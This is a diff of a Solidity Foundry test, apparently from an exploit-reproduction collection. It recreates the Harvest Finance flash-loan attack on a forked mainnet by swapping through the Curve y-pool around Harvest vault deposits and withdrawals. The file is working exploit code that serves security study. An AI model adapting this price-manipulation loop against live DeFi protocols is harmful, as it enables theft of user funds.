@@ -8,13 +8,17 @@ contract ContractTest is DSTest {
   CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
   // CONTRACTS
   // Uniswap ETH/USDC LP (UNI-V2)
-  IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+  IUniswapV2Pair usdcPair =
+    IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
   // Uniswap ETH/USDT LP (UNI-V2)
-  IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
+  IUniswapV2Pair usdtPair =
+    IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
   // Curve y swap
-  IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
+  IcurveYSwap curveYSwap =
+    IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
   // Harvest USDC pool
-  IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
+  IHarvestUsdcVault harvest =
+    IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
 
   // ERC20s
   // 6 decimals on usdt
@@ -30,64 +34,85 @@ contract ContractTest is DSTest {
   // 6 decimals on fUSDC
   IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
 
-  uint usdcLoan = 50000000*10**6;
-  uint usdcRepayment = (usdcLoan * 100301) / 100000;
-  uint usdtLoan = 17300000*10**6;
-  uint usdtRepayment = (usdtLoan * 100301) / 100000;
-  uint usdcBal;
-  uint usdtBal;
+  uint256 usdcLoan = 50000000 * 10**6;
+  uint256 usdcRepayment = (usdcLoan * 100301) / 100000;
+  uint256 usdtLoan = 17300000 * 10**6;
+  uint256 usdtRepayment = (usdtLoan * 100301) / 100000;
+  uint256 usdcBal;
+  uint256 usdtBal;
   CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-  uint256 mainnetFork;
 
-    function setUp() public {
-        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 11129473); //fork mainnet at block 11129473
-        cheats.selectFork(mainnetFork);
-    }
+  function setUp() public {
+    cheats.createSelectFork("mainnet", 11129473); //fork mainnet at block 11129473
+  }
 
-    function testExploit() public {
+  function testExploit() public {
     usdt.approve(address(curveYSwap), type(uint256).max);
     usdc.approve(address(curveYSwap), type(uint256).max);
     usdc.approve(address(harvest), type(uint256).max);
     usdt.approve(address(usdtPair), type(uint256).max);
     usdc.approve(address(usdcPair), type(uint256).max);
-    emit log_named_uint("Before exploitation, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
-    emit log_named_uint("Before exploitation, USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
+    emit log_named_uint(
+      "Before exploitation, USDC balance of attacker:",
+      usdc.balanceOf(address(this)) / 1e6
+    );
+    emit log_named_uint(
+      "Before exploitation, USDT balance of attacker:",
+      usdt.balanceOf(address(this)) / 1e6
+    );
     usdcPair.swap(usdcLoan, 0, address(this), "0x");
 
-    emit log_named_uint("After exploitation, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
-    emit log_named_uint("After exploitation, USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
-    }
+    emit log_named_uint(
+      "After exploitation, USDC balance of attacker:",
+      usdc.balanceOf(address(this)) / 1e6
+    );
+    emit log_named_uint(
+      "After exploitation, USDT balance of attacker:",
+      usdt.balanceOf(address(this)) / 1e6
+    );
+  }
 
-
-    function uniswapV2Call(address,uint,uint,bytes calldata) external {
-
-    if(msg.sender == address(usdcPair)) {
-      emit log_named_uint("Flashloan, Amount of USDT received:", usdc.balanceOf(address(this))/1e6);
+  function uniswapV2Call(
+    address,
+    uint256,
+    uint256,
+    bytes calldata
+  ) external {
+    if (msg.sender == address(usdcPair)) {
+      emit log_named_uint(
+        "Flashloan, Amount of USDT received:",
+        usdc.balanceOf(address(this)) / 1e6
+      );
       usdtPair.swap(0, usdtLoan, address(this), "0x");
       bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);
     }
 
-    if(msg.sender == address(usdtPair)) {
-      emit log_named_uint("Flashloan, Amount of USDT received:", usdt.balanceOf(address(this))/1e6);
-      for(uint i = 0; i < 6; i++){
+    if (msg.sender == address(usdtPair)) {
+      emit log_named_uint(
+        "Flashloan, Amount of USDT received:",
+        usdt.balanceOf(address(this)) / 1e6
+      );
+      for (uint256 i = 0; i < 6; i++) {
         theSwap(i);
-        
       }
       usdt.transfer(msg.sender, usdtRepayment);
     }
-
   }
 
-  function theSwap(uint i) internal {
-
-    curveYSwap.exchange_underlying(2, 1, 17200000*10**6, 17000000*10**6);
+  function theSwap(uint256 i) internal {
+    curveYSwap.exchange_underlying(2, 1, 17200000 * 10**6, 17000000 * 10**6);
     harvest.deposit(49000000000000);
-    curveYSwap.exchange_underlying(1, 2, 17310000*10**6, 17000000*10**6);
+    curveYSwap.exchange_underlying(1, 2, 17310000 * 10**6, 17000000 * 10**6);
     harvest.withdraw(fusdc.balanceOf(address(this)));
-    emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this))/1e6);
-    emit log_named_uint("After swap ,USDT balance of attacker:", usdt.balanceOf(address(this))/1e6);
+    emit log_named_uint(
+      "After swap, USDC balance of attacker:",
+      usdc.balanceOf(address(this)) / 1e6
+    );
+    emit log_named_uint(
+      "After swap ,USDT balance of attacker:",
+      usdt.balanceOf(address(this)) / 1e6
+    );
+  }
 
-  } 
-        receive() external payable {}
-
+  receive() external payable {}
 }
